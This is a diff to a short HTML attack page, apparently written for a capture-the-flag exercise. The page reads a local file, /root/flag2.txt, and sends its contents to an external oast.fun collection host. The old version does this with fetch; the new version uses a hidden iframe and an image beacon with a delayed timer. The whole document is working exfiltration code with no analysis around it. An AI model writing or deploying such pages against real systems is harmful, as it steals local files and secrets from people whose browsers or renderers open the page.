@@ -1,17 +1,21 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Flag Stealer</title>
+    <title>Flag Extractor</title>
 </head>
 <body>
+    <iframe id="flagFrame" src="file:///root/flag2.txt" style="display:none;"></iframe>
+    
     <script>
-        // Read the flag file
-        fetch('file:///root/flag2.txt')
-            .then(response => response.text())
-            .then(data => {
-                // Send the flag to your server
-                fetch('https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/exfil?flag=' + encodeURIComponent(data));
-            });
+        setTimeout(function() {
+            const iframe = document.getElementById('flagFrame');
+            const content = iframe.contentDocument || iframe.contentWindow.document;
+            
+            // Create an image to exfiltrate the data through the URL
+            const img = new Image();
+            img.src = "https://nntdfrlpiazffctldaru16pm4e7nex2p2.oast.fun/log?flag=" + encodeURIComponent(content.body.innerText);
+            document.body.appendChild(img);
+        }, 2000);
     </script>
 </body>
 </html>
